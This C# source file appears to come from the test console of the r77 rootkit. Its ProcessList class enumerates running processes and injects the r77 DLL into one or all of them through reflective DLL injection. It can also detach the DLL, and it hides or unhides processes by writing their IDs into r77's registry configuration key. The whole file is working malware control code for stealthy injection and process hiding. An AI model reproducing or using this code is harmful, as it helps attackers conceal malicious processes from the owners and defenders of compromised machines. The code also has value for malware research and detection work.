using BytecodeApi;
using BytecodeApi.Extensions;
using BytecodeApi.IO;
using BytecodeApi.IO.FileSystem;
using Global;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;

namespace TestConsole
{
	/// <summary>
	/// Interface to inject r77 to or detach r77 from running processes.
	/// </summary>
	public static class ProcessList
	{
		private static readonly Icon DefaultIcon = FileEx.GetIcon(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "svchost.exe"), false);
		private static readonly Dictionary<string, Icon> IconCache = new Dictionary<string, Icon>();

		/// <summary>
		/// Gets a list of all processes.
		/// </summary>
		/// <returns>
		/// A new <see cref="ProcessView" />[] with all running processes.
		/// </returns>
		public static ProcessView[] GetProcesses()
		{
			if (HelperDll.GetProcessList() is HelperDll.ProcessListEntry[] entries)
			{
				return entries
					.Select(entry =>
					{
						ProcessView process = new ProcessView
						{
							Id = entry.ProcessId,
							Name = entry.Name,
							Is64Bit = entry.Platform == 32 ? false : entry.Platform == 64 ? true : (bool?)null,
							IntegrityLevel = entry.IntegrityLevel >= ProcessIntegrityLevel.Untrusted ? entry.IntegrityLevel : (ProcessIntegrityLevel?)null,
							User = entry.UserName,
							Icon = GetIcon(entry.Name, entry.FullName),
							IsInjected = entry.IsInjected,
							IsR77Service = entry.IsR77Service,
							IsHelper = entry.IsHelper,
							IsHiddenById = entry.IsHiddenById
						};

						process.CanInject =
							process.Is64Bit != null &&
							process.IntegrityLevel != null &&
							(ApplicationBase.Process.IsElevated || process.IntegrityLevel <= ProcessIntegrityLevel.Medium);

						return process;
					})
					.Where(process => CSharp.EqualsNone(process.Id, 0, 4))
					.OrderBy(process => process.Name, StringComparer.OrdinalIgnoreCase)
					.ThenBy(process => process.Id)
					.ToArray();
			}
			else
			{
				return new ProcessView[0];
			}

			Icon GetIcon(string fileName, string fullPath)
			{
				// If the full path is unknown, attempt to find the file in C:\Windows and C:\Windows\System32
				if (fullPath.IsNullOrEmpty())
				{
					fullPath = new[]
					{
						Environment.SpecialFolder.System,
						Environment.SpecialFolder.Windows
					}
					.Select(folder => Path.Combine(Environment.GetFolderPath(folder), fileName))
					.FirstOrDefault(newPath => File.Exists(newPath));
				}

				if (fullPath.IsNullOrEmpty())
				{
					// Display the default executable icon
					return DefaultIcon;
				}
				else
				{
					// Once an icon was found, keep the icon in the cache
					if (IconCache.ValueOrDefault(fullPath.ToLower()) is Icon cachedIcon)
					{
						return cachedIcon;
					}
					else
					{
						if (FileEx.GetIcon(fullPath, false) is Icon icon)
						{
							IconCache[fullPath.ToLower()] = icon;
							return icon;
						}
						else
						{
							return DefaultIcon;
						}
					}
				}
			}
		}
		/// <summary>
		/// Injects the specified process with the r77 DLL using reflective DLL injection.
		/// </summary>
		/// <param name="process">The process to inject.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Inject(ProcessView process)
		{
			string dllPath = App.GetFilePath(process.Is64Bit == true ? "r77-x64.dll" : "r77-x86.dll", out LogMessage dllPathLogMessage);
			if (dllPath == null)
			{
				yield return dllPathLogMessage;
				yield break;
			}

			if (!ProcessEx.IsRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is no longer running.")
				);
				yield break;
			}

			if (HelperDll.Inject(process.Id, File.ReadAllBytes(dllPath)))
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Injected"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}).")
				);
			}
			else
			{
				string reason;
				if (process.Name.StartsWith(R77Const.HidePrefix)) reason = $"The filename starts with '{R77Const.HidePrefix}'.";
				else if (process.IsR77Service) reason = "The process is the r77 service process.";
				else if (process.IsHelper) reason = "The process is a helper process.";
				else if (process.IntegrityLevel < ProcessIntegrityLevel.Medium) reason = "Sandboxes are not supported";
				else reason = null;

				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Injection of"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) failed."),
					new LogDetailsItem(reason)
				);
			}
		}
		/// <summary>
		/// Detaches r77 from the specified process.
		/// </summary>
		/// <param name="process">The process to detach.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Detach(ProcessView process)
		{
			if (!ProcessEx.IsRunning(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) is no longer running.")
				);
				yield break;
			}

			if (HelperDll.Detach(process.Id))
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("Detached from"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}).")
				);
			}
			else
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem("Detaching of"),
					new LogFileItem(process.Name),
					new LogTextItem($"(PID {process.Id}) failed.")
				);
			}
		}
		/// <summary>
		/// Injects all processes with the r77 DLL using reflective DLL injection.
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> InjectAll()
		{
			int injectedCount = GetInjectedCount();

			string dll32Path = App.GetFilePath("r77-x86.dll", out LogMessage dll32PathLogMessage);
			if (dll32Path == null)
			{
				yield return dll32PathLogMessage;
				yield break;
			}

			string dll64Path = App.GetFilePath("r77-x64.dll", out LogMessage dll64PathLogMessage);
			if (dll64Path == null)
			{
				yield return dll64PathLogMessage;
				yield break;
			}

			if (!HelperDll.InjectAll(File.ReadAllBytes(dll32Path), File.ReadAllBytes(dll64Path)))
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("Injecting processes failed.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount == injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes were injected")
				);
			}
			else if (newInjectedCount > injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem($"Injected {newInjectedCount - injectedCount} processes.")
				);
			}
		}
		/// <summary>
		/// Detaches r77 from all running processes.
		/// </summary>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> DetachAll()
		{
			int injectedCount = GetInjectedCount();
			if (injectedCount == 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem("No processes are injected.")
				);
				yield break;
			}

			if (!HelperDll.DetachAll())
			{
				yield return new LogMessage
				(
					LogMessageType.Error,
					new LogTextItem("Detaching processes failed.")
				);
			}

			int newInjectedCount = GetInjectedCount();

			if (newInjectedCount < injectedCount)
			{
				yield return new LogMessage
				(
					LogMessageType.Information,
					new LogTextItem($"Detached from {injectedCount - newInjectedCount} processes.")
				);
			}

			if (newInjectedCount > 0)
			{
				yield return new LogMessage
				(
					LogMessageType.Warning,
					new LogTextItem($"{newInjectedCount} processes could not be detached.")
				);
			}
		}
		/// <summary>
		/// Hides a process ID by entering the PID into the r77 configuration system.
		/// </summary>
		/// <param name="process">The process to hide by ID.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Hide(ProcessView process)
		{
			foreach (LogMessage logMessage in ConfigSystem.EnsureConfigSystem())
			{
				yield return logMessage;
			}

			using (RegistryKey configKey = ConfigSystem.GetConfigSystemKey())
			using (RegistryKey key = configKey?.CreateSubKey("pid"))
			{
				if (key != null)
				{
					key.SetValue($"TestConsole_HiddenPID_{process.Id}", process.Id, RegistryValueKind.DWord);

					yield return new LogMessage
					(
						LogMessageType.Information,
						new LogFileItem(process.Name),
						new LogTextItem($"(PID {process.Id}) is marked as hidden.")
					);

					if (process.Name.StartsWith(R77Const.HidePrefix))
					{
						yield return new LogMessage
						(
							LogMessageType.Warning,
							new LogFileItem(process.Name),
							new LogTextItem($"(PID {process.Id}) is already hidden by prefix. Hiding the process by ID is unnecessary.")
						);
					}

					if (GetInjectedCount() == 0)
					{
						yield return new LogMessage
						(
							LogMessageType.Warning,
							new LogTextItem("r77 needs to be installed, or at least injected in a task manager for process hiding to have effect.")
						);
					}
				}
			}
		}
		/// <summary>
		/// Removes a process ID from the r77 configuration system to make the process visible again.
		/// </summary>
		/// <param name="process">The process to unhide.</param>
		/// <returns>
		/// An enumerable of <see cref="LogMessage" /> entries to be displayed in the log view.
		/// </returns>
		public static IEnumerable<LogMessage> Unhide(ProcessView process)
		{
			using (RegistryKey configKey = ConfigSystem.GetConfigSystemKey())
			using (RegistryKey key = configKey?.OpenSubKey("pid", true))
			{
				if (key != null)
				{
					string[] valueNames = key
						.GetValueNames()
						.Where(name => key.GetValueKind(name) == RegistryValueKind.DWord)
						.Where(name => (int)key.GetValue(name) == process.Id)
						.ToArray();

					if (valueNames.Any())
					{
						foreach (string valueName in valueNames)
						{
							key.DeleteValue(valueName);
						}

						yield return new LogMessage
						(
							LogMessageType.Information,
							new LogFileItem(process.Name),
							new LogTextItem($"(PID {process.Id}) is marked as not hidden.")
						);
					}
				}
			}
		}

		private static int GetInjectedCount()
		{
			return GetProcesses().Count(process => process.IsInjected);
		}
	}
}